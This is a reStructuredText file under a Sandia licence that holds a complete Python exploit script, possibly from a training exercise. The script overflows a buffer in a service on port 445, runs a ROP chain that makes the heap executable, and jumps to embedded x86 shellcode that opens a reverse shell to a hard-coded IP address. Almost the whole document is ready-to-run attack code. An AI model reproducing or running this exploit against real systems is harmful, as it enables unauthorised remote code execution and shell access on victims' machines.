.. Copyright 2022 National Technology & Engineering Solutions of Sandia, LLC
   (NTESS).  Under the terms of Contract DE-NA0003525 with NTESS, the U.S.
   Government retains certain rights in this software.
   
   Redistribution and use in source and binary/rendered forms, with or without
   modification, are permitted provided that the following conditions are met:
   
    1. Redistributions of source code must retain the above copyright notice,
       this list of conditions and the following disclaimer.
    2. Redistributions in binary/rendered form must reproduce the above copyright
       notice, this list of conditions and the following disclaimer in the
       documentation and/or other materials provided with the distribution.
    3. Neither the name of the copyright holder nor the names of its contributors
       may be used to endorse or promote products derived from this software
       without specific prior written permission.
   
   THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
   ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
   WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
   DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
   FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
   DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
   SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
   CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
   OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
   OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

.. code::

 import socket
 import sys
 import hexdump
 import struct
 
 # BOB_ADDRESS = 0x8074cf0 + 0x10 - 0x8
 BOB_OFFSET_ADDRESS = 0x8074cf0 + 0x10 + 0x2f76ef36
 SYSCALL_GADGET = 0xffffe422
 REPLACEMENT_BYTES = struct.pack("<I", 0xABCDEFAB)
 
 
 def get_shell_code():
     shellcode =  b""
     shellcode += b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1"
     shellcode += b"\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49"
     shellcode += b"\x79\xf9\x68\xac\x10\x3d\x8a\x68\x02\x00\x15"
     shellcode += b"\xb3\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89"
     shellcode += b"\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f"
     shellcode += b"\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b"
     shellcode += b"\xcd\x80"
 
 
     return shellcode
 
 
 def craft_decode(str_to_encode, pad_char =  ' ', end = 'A'):
     # Just being silly, because this is a 5-minute thing
     if len(str_to_encode) > 0xF:
         str_to_encode = str_to_encode[:0xF + 1]
 
     str_to_encode += pad_char * (0xF - len(str_to_encode))
     str_to_encode += end
 
     component_ints = list()
     for c in str_to_encode:
         component_ints.append(ord(c) // 0x10)
         component_ints.append(ord(c) % 0x10)
     component_chars = [chr(x + 0x41) for x in component_ints]
 
     return ''.join(component_chars)
 
 
 def decode_str(str_to_decode):
     if len(str_to_decode) % 2 != 0:
         return None
 
     final_str = ""
     for i in range(0, len(str_to_decode), 2):
         c1 = (ord(str_to_decode[i]) - 0x41) * 0x10
         c2 = ord(str_to_decode[i + 1]) - 0x41
         c = c1 | c2
         final_str += chr(c)
 
     return final_str
 
 
 def craft_payload():
     # The number of bytes we have before the return address
     # The subtracted value is because we end up with a NULL in there
     total_overrun_buffer_size = 0x40 - 0x1
 
     # We need in 0x22 bytes ahead of our structured buffer
     padding = b'\x01' * 0x22
 
     # ---- Structured buffer ----
 
     # This will decode normally within the function
     # I'm not sure it's necessary, but maybe less likely to break things?
     # I'm certain there are other options too
     encoded_str = craft_decode("HELLO WORLD")
     # Stick the bytes that will decode validly at the front
     payload_core = struct.pack("<B", len(encoded_str))
     payload_core += encoded_str.encode("utf-8")
 
     # Now, for the interesting things, which will be overwriting
     # the rest of the stack
 
     # So, at the front, we just have some padding
     overflow_bytes = b'\x01' * (total_overrun_buffer_size - len(encoded_str))
 
     # And here we begin the ROP chain
 
     # Gadgets:
     # 0x0804f7da: pop eax; pop ebx; pop epb; ret;
     # 0xffffe425: pop edx; pop ecx; ret;
     # 0x0804f672: add eax, dword ptr [ebx - 0x2f76ef36]; pop ebp; ret;
     # 0x0804e153: jmp eax;
 
     # --- Make the heap executable ---
     # Setup
     overflow_bytes += struct.pack("<I", 0x0804f7da) # pop eax; pop ebx; pop epb; ret;
     overflow_bytes += struct.pack("<I", 0x7d) # eax - sys call code
     overflow_bytes += struct.pack("<I", 0x8072000) # ebx - heap address
     overflow_bytes += struct.pack("<I", 0x0) # ebp - N/A
 
     overflow_bytes += struct.pack("<I", 0xffffe425) # pop edx; pop ecx; ret;
     overflow_bytes += struct.pack("<I", 0x07) # edx - RWX flag
     overflow_bytes += struct.pack("<I", 0x14000) # ecx - size of heap
 
     # And, run
     overflow_bytes += struct.pack("<I", 0xffffe422) # int 0x80; pop ebp; pop edx; pop ecx; ret
 
     overflow_bytes += struct.pack("<I", 0x0) # ebp - N/A
     overflow_bytes += struct.pack("<I", 0x0) # edx - N/A
     overflow_bytes += struct.pack("<I", 0x0) # ecx - N/A
 
     # --- Get into the payload ---
 
     # Use the first one again to set up eax and ebx
     overflow_bytes += struct.pack("<I", 0x804f7da) # pop eax; pop ebx; pop epb; ret;
     # Setting this to a value we'll *replace* as soon as we know our actual offset
     overflow_bytes += REPLACEMENT_BYTES # eax - offset into our buffer where our code is
     overflow_bytes += struct.pack("<I", BOB_OFFSET_ADDRESS) # ebx - Our weirdly offset address to Bob
     overflow_bytes += struct.pack("<I", 0x0) # ebp - N/A
 
     # Now for the calculation
     overflow_bytes += struct.pack("<I", 0x804f672) # add eax, dword ptr [ebx - 0x2f76ef36]; pop ebp; ret;
     overflow_bytes += struct.pack("<I", 0x0) # ebp - N/A
 
     # And jump!
     overflow_bytes += struct.pack("<I", 0x804e153) # jmp eax;
 
     # Finish the structured buffer
 
     # Add the overflow bytes to the structured bit
     payload_core += struct.pack("<B", len(overflow_bytes))
     payload_core += overflow_bytes
 
     # And now a clean finish
     payload_core += struct.pack("<B", 0)
 
     # ---- Add the actual shell code ----
     # Just some test bytes for now
     shell_code = get_shell_code()
 
     # Header size + padding + the core
     offset_to_shell = 0x4 + len(padding) + len(payload_core)
     payload_core = payload_core.replace(REPLACEMENT_BYTES, struct.pack("<I", offset_to_shell))
 
     # Put together the header (waited until here to throw in a size that matches what
     # we have. Necessary to match actual size? Not sure. Might just need it to be biggish)
     # Start with 0x81, the message type that will take us down the path we want
     payload_header = b'\x81'
     # Add the size val. It's 3 bytes, which is a little odd, so slice off the first one
     size_bytes = struct.pack(">I", len(padding) + len(payload_core) + len(shell_code))
     size_bytes = size_bytes[1:]
     payload_header += size_bytes
 
     payload = payload_header + padding + payload_core + shell_code
 
     return payload
 
 
 def main():
     payload = craft_payload()
 
     if len(sys.argv) != 2:
         print("{} ip".format(sys.argv[0]))
         sys.exit(1)
 
     ip = sys.argv[1]
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((ip, 445))
     s.sendall(payload)
 
     data = s.recv(1000)
     print(hexdump.hexdump(data))
 
 
 if __name__ == '__main__':
     main()
 
